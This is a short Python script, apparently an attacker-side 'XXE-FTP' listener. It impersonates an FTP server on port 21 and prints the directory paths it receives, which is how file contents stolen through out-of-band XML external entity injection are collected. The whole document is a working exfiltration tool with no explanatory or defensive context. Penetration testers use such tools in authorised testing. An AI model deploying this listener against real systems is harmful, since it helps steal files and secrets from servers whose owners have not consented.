#!/usr/env/python
from __future__ import print_function
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0',21))
s.listen(1)
print('XXE-FTP listening ')
conn,addr = s.accept()
print('Connected by %s',addr)
conn.sendall('220 Staal XXE-FTP\r\n')
stop = False
while not stop:
    dp = str(conn.recv(1024))
    if dp.find("USER") > -1:
        conn.sendall("331 password please - version check\r\n")
    else:
        conn.sendall("230 more data please!\r\n")
    if dp.find("RETR")==0 or dp.find("QUIT")==0:
        stop = True
    if dp.find("CWD") > -1:
        print(dp.replace('CWD ','/',1).replace('\r\n',''),end='')
    else:
        print(dp)

conn.close()
s.close()
